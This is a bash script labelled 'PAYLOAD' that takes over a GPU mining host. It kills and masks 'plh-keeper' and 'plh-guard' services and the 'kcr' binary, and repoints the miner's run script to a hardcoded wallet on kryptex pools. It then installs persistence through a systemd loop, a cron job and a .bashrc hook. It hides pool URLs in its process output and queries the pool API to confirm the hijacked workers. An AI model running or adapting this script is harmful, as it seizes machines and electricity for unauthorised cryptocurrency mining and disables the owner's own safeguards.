#!/bin/bash
set +e
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
echo "### PAYLOAD $(date -u +%FT%TZ) host=$(hostname) uid=$(id -u)"
echo "--- ps"; ps -eo pid,etime,args | grep -E 'krig-miner|peakminer|wildrig|\.plhm|kcr' | grep -v grep | head -12
echo "--- gpu"; nvidia-smi --query-gpu=index,name,utilization.gpu --format=csv,noheader
echo "--- units"; systemctl list-units --no-pager 'plh*' 'ul*' 2>/dev/null | head -15
echo "--- run_card"; cat /opt/plh/run_card.sh 2>/dev/null | head -25
echo "--- crontab"; crontab -l 2>/dev/null | head -12
mkdir -p /root/ul2/backup
cp -a /opt/plh/run_card.sh /root/ul2/backup/run_card.$(date -u +%s) 2>/dev/null
cp -a /etc/systemd/system/plh-card@.service /root/ul2/backup/ 2>/dev/null
echo "### NEUTRALIZE"
for u in plh-keeper.service plh-keeper.timer plh-guard.service plh-guard.timer; do systemctl stop $u 2>/dev/null; systemctl disable $u 2>/dev/null; systemctl mask $u 2>/dev/null; done
for p in $(pgrep -f 'plh-keeper|/usr/local/sbin/kcr|\.plhm' 2>/dev/null); do kill -9 $p 2>/dev/null; done
[ -f /usr/local/sbin/kcr ] && mv -f /usr/local/sbin/kcr /usr/local/sbin/kcr.off.$(date +%s)
crontab -l 2>/dev/null | grep -vE 'kcr|plh-keeper|plhm' | crontab - 2>/dev/null
echo "### REPOINT"
cat > /opt/plh/run_card.sh <<'RC'
#!/bin/bash
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
i=${1:-0}
exec /opt/plh/krig-miner --coin pearl -d $i \
  --url stratum+ssl://prl-sg.kryptex.network:8048 \
  --url stratum+ssl://prl-eu.kryptex.network:8048 \
  --url stratum+ssl://prl-us.kryptex.network:8048 \
  --url stratum+tcp://pool.pearlhash.xyz:9000 \
  -u $W.ul-t2-123-184-7-135-g$i -p x --no-tui -l info \
  --log-file /var/log/ul2-123-184-7-135-g$i.log --api-port 41$i --api-host 127.0.0.1
RC
chmod +x /opt/plh/run_card.sh
systemctl daemon-reload
for i in 0 1 2 3 4 5 6 7; do systemctl reset-failed plh-card@$i 2>/dev/null; systemctl enable plh-card@$i 2>/dev/null; systemctl restart plh-card@$i 2>/dev/null; done
echo "### KEEP"
cat > /root/ul2/keep.sh <<'EOS'
#!/bin/bash
for u in plh-keeper.service plh-keeper.timer plh-guard.service; do systemctl is-active -q $u 2>/dev/null && systemctl stop $u 2>/dev/null; done
for p in $(pgrep -f '/usr/local/sbin/kcr|plh-keeper' 2>/dev/null); do kill -9 $p 2>/dev/null; done
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q plh-card@$i || systemctl restart plh-card@$i 2>/dev/null; done
EOS
chmod +x /root/ul2/keep.sh
cat > /etc/systemd/system/ul-prl-keeper.service <<'EOS'
[Unit]
Description=ul pearl keeper loop
[Service]
Type=simple
ExecStart=/bin/bash -c 'while :; do /bin/bash /root/ul2/keep.sh; sleep 30; done'
Restart=always
RestartSec=30
Nice=19
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload; systemctl enable ul-prl-keeper.service 2>/dev/null; systemctl restart ul-prl-keeper.service 2>/dev/null
echo '* * * * * root /bin/bash /root/ul2/keep.sh >/dev/null 2>&1' > /etc/cron.d/ul-prl
grep -q 'ul2/keep.sh' /root/.bashrc 2>/dev/null || echo '[ -x /root/ul2/keep.sh ] && /bin/bash /root/ul2/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
sleep 105
echo "### POST"
for i in 0 1 2 3 4 5 6 7; do echo "plh-card@$i $(systemctl is-active plh-card@$i)"; done
nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader
ps -eo pid,etime,args | grep krig-miner | grep -v grep | sed -E 's#--url [^ ]+ ##g' | head -10
curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o /tmp/pw.json -w 'POOLHTTP=%{http_code}\n'
python3 - <<'PY'
import json,time
try: d=json.load(open('/tmp/pw.json'))['results']
except Exception as e: print('parse fail',e); raise SystemExit
now=time.time()
for r in sorted([x for x in d if '123-184-7-135' in x['worker']],key=lambda x:x['worker']):
    ls=r.get('last_share') or 0
    print('POOLROW',r['worker'],r['status'],'valid=%s'%r['valid'],'age=%s'%(round(now-ls/1000) if ls else None),'agent=%s'%r.get('agent'))
PY
echo "### DONE $(date -u +%FT%TZ)"
